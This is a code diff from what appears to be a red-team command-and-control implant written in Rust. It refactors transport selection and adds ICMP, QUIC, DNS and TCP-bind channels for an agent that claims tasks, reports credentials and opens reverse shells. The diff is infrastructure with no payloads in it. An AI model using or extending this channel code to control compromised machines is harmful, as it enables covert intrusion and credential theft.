@@ -1,7 +1,9 @@
 use anyhow::{anyhow, Result};
 use pb::c2::transport::Type as TransportType;
-use pb::{c2::*, config::Config};
-use std::sync::mpsc::{Receiver, Sender};
+use pb::config::Config;
+
+#[cfg(any(feature = "grpc", feature = "http1", feature = "quic"))]
+mod tls_utils;
 
 #[cfg(feature = "grpc")]
 mod grpc;
@@ -12,266 +14,110 @@ mod dns_resolver;
 #[cfg(feature = "http1")]
 mod http;
 
+#[cfg(any(feature = "dns", feature = "icmp"))]
+mod conv;
+
 #[cfg(feature = "dns")]
 mod dns;
+
+#[cfg(feature = "icmp")]
+mod icmp;
 
 #[cfg(feature = "mock")]
 mod mock;
 #[cfg(feature = "mock")]
 pub use mock::MockTransport;
 
+#[cfg(feature = "tcp-bind")]
+mod tcp_bind;
+#[cfg(feature = "tcp-bind")]
+pub use tcp_bind::TcpBindTransport;
+
+#[cfg(feature = "quic")]
+mod quic;
+
 mod transport;
 pub use transport::Transport;
 
-#[derive(Clone)]
-pub enum ActiveTransport {
+/// Returns an empty (disconnected) transport using the default (gRPC) transport type.
+/// Use this to initialize or reset transport state without an active connection.
+pub fn init_transport() -> Box<dyn Transport + Send + Sync> {
     #[cfg(feature = "grpc")]
-    Grpc(grpc::GRPC),
-    #[cfg(feature = "http1")]
-    Http(http::HTTP),
-    #[cfg(feature = "dns")]
-    Dns(dns::DNS),
-    #[cfg(feature = "mock")]
-    Mock(mock::MockTransport),
-    Empty,
+    return Box::new(grpc::GRPC::init());
+    #[cfg(all(not(feature = "grpc"), feature = "http1"))]
+    return Box::new(http::HTTP::init());
+    #[cfg(all(not(feature = "grpc"), not(feature = "http1"), feature = "dns"))]
+    return Box::new(dns::DNS::init());
+    #[cfg(all(
+        not(feature = "grpc"),
+        not(feature = "http1"),
+        not(feature = "dns"),
+        feature = "quic"
+    ))]
+    return Box::new(quic::QuicTransport::init());
+    #[cfg(not(any(feature = "grpc", feature = "http1", feature = "dns", feature = "quic")))]
+    compile_error!("At least one transport feature must be enabled");
 }
 
-impl Transport for ActiveTransport {
-    fn init() -> Self {
-        Self::Empty
-    }
+pub fn create_transport(config: Config) -> Result<Box<dyn Transport + Send + Sync>> {
+    // Extract transport type from config
+    let transport_type = config
+        .info
+        .as_ref()
+        .and_then(|info| info.available_transports.as_ref())
+        .and_then(|at| {
+            let active_idx = at.active_index as usize;
+            at.transports
+                .get(active_idx)
+                .or_else(|| at.transports.first())
+        })
+        .map(|t| t.r#type)
+        .ok_or_else(|| anyhow!("No transports configured"))?;
 
-    fn new(config: Config) -> Result<Self> {
-        // Extract transport type from config
-        let transport_type = config
-            .info
-            .as_ref()
-            .and_then(|info| info.available_transports.as_ref())
-            .and_then(|at| {
-                let active_idx = at.active_index as usize;
-                at.transports
-                    .get(active_idx)
-                    .or_else(|| at.transports.first())
-            })
-            .map(|t| t.r#type)
-            .ok_or_else(|| anyhow!("No transports configured"))?;
-
-        // Match on the transport type enum
-        match TransportType::try_from(transport_type) {
-            Ok(TransportType::TransportGrpc) => {
-                #[cfg(feature = "grpc")]
-                return Ok(ActiveTransport::Grpc(grpc::GRPC::new(config)?));
-                #[cfg(not(feature = "grpc"))]
-                return Err(anyhow!("gRPC transport not enabled"));
-            }
-            Ok(TransportType::TransportHttp1) => {
-                #[cfg(feature = "http1")]
-                return Ok(ActiveTransport::Http(http::HTTP::new(config)?));
-                #[cfg(not(feature = "http1"))]
-                return Err(anyhow!("http1 transport not enabled"));
-            }
-            Ok(TransportType::TransportDns) => {
-                #[cfg(feature = "dns")]
-                return Ok(ActiveTransport::Dns(dns::DNS::new(config)?));
-                #[cfg(not(feature = "dns"))]
-                return Err(anyhow!("DNS transport not enabled"));
-            }
-            Ok(TransportType::TransportUnspecified) | Err(_) => {
-                Err(anyhow!("Invalid or unspecified transport type"))
-            }
-        }
-    }
-
-    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
-        match self {
+    // Match on the transport type enum
+    match TransportType::try_from(transport_type) {
+        Ok(TransportType::TransportGrpc) => {
             #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.claim_tasks(request).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.claim_tasks(request).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.claim_tasks(request).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.claim_tasks(request).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+            return Ok(Box::new(grpc::GRPC::new(config)?));
+            #[cfg(not(feature = "grpc"))]
+            return Err(anyhow!("gRPC transport not enabled"));
         }
-    }
-
-    async fn fetch_asset(
-        &mut self,
-        request: FetchAssetRequest,
-        sender: Sender<FetchAssetResponse>,
-    ) -> Result<()> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.fetch_asset(request, sender).await,
+        Ok(TransportType::TransportHttp1) => {
             #[cfg(feature = "http1")]
-            Self::Http(t) => t.fetch_asset(request, sender).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.fetch_asset(request, sender).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.fetch_asset(request, sender).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+            return Ok(Box::new(http::HTTP::new(config)?));
+            #[cfg(not(feature = "http1"))]
+            return Err(anyhow!("http1 transport not enabled"));
         }
-    }
-
-    async fn report_credential(
-        &mut self,
-        request: ReportCredentialRequest,
-    ) -> Result<ReportCredentialResponse> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.report_credential(request).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.report_credential(request).await,
+        Ok(TransportType::TransportDns) => {
             #[cfg(feature = "dns")]
-            Self::Dns(t) => t.report_credential(request).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.report_credential(request).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+            return Ok(Box::new(dns::DNS::new(config)?));
+            #[cfg(not(feature = "dns"))]
+            return Err(anyhow!("DNS transport not enabled"));
         }
-    }
-
-    async fn report_file(
-        &mut self,
-        request: Receiver<ReportFileRequest>,
-    ) -> Result<ReportFileResponse> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.report_file(request).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.report_file(request).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.report_file(request).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.report_file(request).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+        Ok(TransportType::TransportUds) => {
+            Err(anyhow!("UDS transport is provided by pro-transports"))
         }
-    }
-
-    async fn report_process_list(
-        &mut self,
-        request: ReportProcessListRequest,
-    ) -> Result<ReportProcessListResponse> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.report_process_list(request).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.report_process_list(request).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.report_process_list(request).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.report_process_list(request).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+        Ok(TransportType::TransportTcpBind) => {
+            #[cfg(feature = "tcp-bind")]
+            return Ok(Box::new(tcp_bind::TcpBindTransport::new(config)?));
+            #[cfg(not(feature = "tcp-bind"))]
+            return Err(anyhow!("TCP Bind transport not enabled"));
         }
-    }
-
-    async fn report_task_output(
-        &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.report_task_output(request).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.report_task_output(request).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.report_task_output(request).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.report_task_output(request).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+        Ok(TransportType::TransportIcmp) => {
+            #[cfg(feature = "icmp")]
+            return Ok(Box::new(icmp::ICMP::new(config)?));
+            #[cfg(not(feature = "icmp"))]
+            return Err(anyhow!("ICMP transport not enabled"));
         }
-    }
-
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.reverse_shell(rx, tx).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.reverse_shell(rx, tx).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.reverse_shell(rx, tx).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.reverse_shell(rx, tx).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+        Ok(TransportType::TransportQuic) => {
+            #[cfg(feature = "quic")]
+            return Ok(Box::new(quic::QuicTransport::new(config)?));
+            #[cfg(not(feature = "quic"))]
+            return Err(anyhow!("QUIC transport not enabled"));
         }
-    }
-
-    async fn create_portal(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
-        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
-    ) -> Result<()> {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.create_portal(rx, tx).await,
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.create_portal(rx, tx).await,
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.create_portal(rx, tx).await,
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.create_portal(rx, tx).await,
-            Self::Empty => Err(anyhow!("Transport not initialized")),
+        Ok(TransportType::TransportUnspecified) | Err(_) => {
+            Err(anyhow!("Invalid or unspecified transport type"))
         }
-    }
-
-    fn get_type(&mut self) -> pb::c2::transport::Type {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.get_type(),
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.get_type(),
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.get_type(),
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.get_type(),
-            Self::Empty => pb::c2::transport::Type::TransportUnspecified,
-        }
-    }
-
-    fn is_active(&self) -> bool {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.is_active(),
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.is_active(),
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.is_active(),
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.is_active(),
-            Self::Empty => false,
-        }
-    }
-
-    fn name(&self) -> &'static str {
-        match self {
-            #[cfg(feature = "grpc")]
-            Self::Grpc(t) => t.name(),
-            #[cfg(feature = "http1")]
-            Self::Http(t) => t.name(),
-            #[cfg(feature = "dns")]
-            Self::Dns(t) => t.name(),
-            #[cfg(feature = "mock")]
-            Self::Mock(t) => t.name(),
-            Self::Empty => "none",
-        }
-    }
-
-    #[allow(clippy::vec_init_then_push)]
-    fn list_available(&self) -> Vec<String> {
-        let mut list = Vec::new();
-        #[cfg(feature = "grpc")]
-        list.push("grpc".to_string());
-        #[cfg(feature = "http1")]
-        list.push("http".to_string());
-        #[cfg(feature = "dns")]
-        list.push("dns".to_string());
-        #[cfg(feature = "mock")]
-        list.push("mock".to_string());
-        list
     }
 }
 
@@ -290,6 +136,7 @@ mod tests {
                         interval: 5,
                         r#type: transport_type,
                         extra: extra.to_string(),
+                        jitter: 0.0,
                     }],
                     active_index: 0,
                 }),
@@ -314,14 +161,11 @@ mod tests {
 
         for uri in inputs {
             let config = create_test_config(uri, TransportType::TransportGrpc as i32, "{}");
-            let result = ActiveTransport::new(config);
+            let result = create_transport(config);
 
             // 1. Assert strictly on the Variant type
-            assert!(
-                matches!(result, Ok(ActiveTransport::Grpc(_))),
-                "URI '{}' did not resolve to ActiveTransport::Grpc",
-                uri
-            );
+            assert!(result.is_ok(), "URI '{}' did not resolve to Grpc", uri);
+            assert_eq!(result.unwrap().name(), "grpc");
         }
     }
 
@@ -333,13 +177,24 @@ mod tests {
 
         for uri in inputs {
             let config = create_test_config(uri, TransportType::TransportHttp1 as i32, "{}");
-            let result = ActiveTransport::new(config);
+            let result = create_transport(config);
 
-            assert!(
-                matches!(result, Ok(ActiveTransport::Http(_))),
-                "URI '{}' did not resolve to ActiveTransport::Http",
-                uri
-            );
+            assert!(result.is_ok(), "URI '{}' did not resolve to Http", uri);
+            assert_eq!(result.unwrap().name(), "http");
+        }
+    }
+
+    #[tokio::test]
+    #[cfg(feature = "quic")]
+    async fn test_routes_to_quic_transport() {
+        let inputs = vec!["quic://127.0.0.1:8443", "quics://127.0.0.1:8443"];
+
+        for uri in inputs {
+            let config = create_test_config(uri, TransportType::TransportQuic as i32, "{}");
+            let result = create_transport(config);
+
+            assert!(result.is_ok(), "URI '{}' did not resolve to Quic", uri);
+            assert_eq!(result.unwrap().name(), "quic");
         }
     }
 
@@ -358,14 +213,15 @@ mod tests {
 
         for (uri, extra) in inputs {
             let config = create_test_config(uri, TransportType::TransportDns as i32, extra);
-            let result = ActiveTransport::new(config);
+            let result = create_transport(config);
 
             assert!(
-                matches!(result, Ok(ActiveTransport::Dns(_))),
-                "URI '{}' with extra '{}' did not resolve to ActiveTransport::Dns",
+                result.is_ok(),
+                "URI '{}' with extra '{}' did not resolve to Dns",
                 uri,
                 extra
             );
+            assert_eq!(result.unwrap().name(), "dns");
         }
     }
 
@@ -376,7 +232,7 @@ mod tests {
         let inputs = vec!["grpc://foo", "grpcs://foo", "http://foo"];
         for uri in inputs {
             let config = create_test_config(uri, TransportType::TransportGrpc as i32, "{}");
-            let result = ActiveTransport::new(config);
+            let result = create_transport(config);
             assert!(
                 result.is_err(),
                 "Expected error for '{}' when gRPC feature is disabled",
@@ -393,7 +249,7 @@ mod tests {
             TransportType::TransportUnspecified as i32,
             "{}",
         );
-        let result = ActiveTransport::new(config);
+        let result = create_transport(config);
         assert!(result.is_err(), "Expected error for unknown transport type");
     }
 }
